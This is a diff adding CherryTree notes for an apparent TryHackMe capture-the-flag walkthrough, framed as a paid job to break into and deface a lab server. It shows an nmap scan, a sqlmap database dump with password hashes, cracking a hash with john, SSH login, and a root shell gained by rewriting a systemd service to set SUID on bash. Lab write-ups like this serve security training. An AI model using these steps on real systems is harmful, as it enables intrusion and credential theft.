@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="Revenge" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692906796" ts_lastsave="1692910212">
+    <rich_text>To whom it may concern,
+
+I know it was you who hacked my blog.  I was really impressed with your skills.  You were a little sloppy 
+and left a bit of a footprint so I was able to track you down.  But, thank you for taking me up on my offer.  
+I've done some initial enumeration of the site because I know *some* things about hacking but not enough.  
+For that reason, I'll let you do your own enumeration and checking.
+
+What I want you to do is simple.  Break into the server that's running the website and deface the front page.  
+I don't care how you do it, just do it.  But remember...DO NOT BRING DOWN THE SITE!  We don't want to cause irreparable damage.
+
+When you finish the job, you'll get the rest of your payment.  We agreed upon $5,000.  
+Half up-front and half when you finish.
+
+Good luck,
+Billy
+
+nmap -sC -sV -Pn -vv 10.10.171.73
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 7253b77aebab22701cf73c7ac776d989 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBiHOfDlVoYCp0+/LM7BhujeUicHQ+HwAidwcp1yMZE3j6K/7RW3XsNSEyUR8RpVaXAHl7ThNfD2pmzGPBV9uOjNlgNuzhASOgQuz9G4hQyLh5u1Sv9QR8R9udClyRoqUwGBfdNKjqAK2Kw7OghAHXlwUxniYRLUeAD60oLjm4uIv+1QlA2t5/LL6utV2ePWOEHe8WehXPGrstJtJ8Jf/uM48s0jhLhMEewzSqR2w0LWAGDFzOdfnOvcyQtJ9FeswJRG7fWXXsOms0Fp4lhTL4fknL+PSdWEPagTjRfUIRxskkFsaxI//3EulETC+gSa+KilVRfiKAGTdrdz7RL5sl
+|   256 437700fbda42025852127dcd4e524fc3 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNNoSioP7IDDu4yIVfGnhLoMTyvBuzxILnRr7rKGX0YpNShJfHLjEQRIdUoYq+/7P0wBjLoXn9g7XpLLb7UMvm4=
+|   256 2b57137cc84f1dc26867283f8e3930ab (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEpROzuQcffRwKXCOz+JQ5p7QKnAQVEDUwwUkkblavyh
+
+
+
+
+80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
+|_http-favicon: Unknown favicon MD5: E859DC70A208F0F0242640410296E06A
+|_http-title: Home | Rubber Ducky Inc.
+| http-methods: 
+|_  Supported Methods: GET HEAD OPTIONS
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+IDOR vulnerability
+sqlmap -u </rich_text>
+    <rich_text link="webs http://10.10.171.73">http://10.10.171.73</rich_text>
+    <rich_text> --batch --dump
+6  | ap@krasco.org                   | Krasco Org       | mandrews | $2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC | thm{br3ak1ng_4nd_3nt3r1ng} 
+
+Database: duckyinc                                                                                                                                                                                                              
+Table: system_user
+[3 entries]
++----+----------------------+--------------+--------------------------------------------------------------+
+| id | email                | username     | _password                                                    |
++----+----------------------+--------------+--------------------------------------------------------------+
+| 1  | sadmin@duckyinc.org  | server-admin | $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a |
+| 2  | kmotley@duckyinc.org | kmotley      | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
+| 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
+
+using john to find any one of the hashes
+john --wordlist=rockyou.txt hashes
+inuyasha         (?)
+
+ssh kmotley@10.10.171.73
+ssh dhughes@10.10.171.73
+ssh dhughes@10.10.171.73		-		inuyasha
+
+sudo -l
+Matching Defaults entries for server-admin on duckyinc:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User server-admin may run the following commands on duckyinc:
+    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart duckyinc.service, /bin/systemctl daemon-reload, </rich_text>
+    <rich_text background="#a5a51d1d2d2d">sudoedit /etc/systemd/system/duckyinc.service</rich_text>
+    <rich_text>
+
+
+Editing the file to gain a root shell replace the existing service with this do not create a new service which would fail at restart
+[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "chmod +s /bin/bash"
+
+server-admin@duckyinc:/etc/systemd$ sudoedit /etc/systemd/system/duckyinc.service
+server-admin@duckyinc:/etc/systemd$ sudo /bin/systemctl daemon-reload
+server-admin@duckyinc:/etc/systemd$ sudo /bin/systemctl restart duckyinc.service
+/bin/bash -p
+
+
+</rich_text>
+  </node>
+</cherrytree>
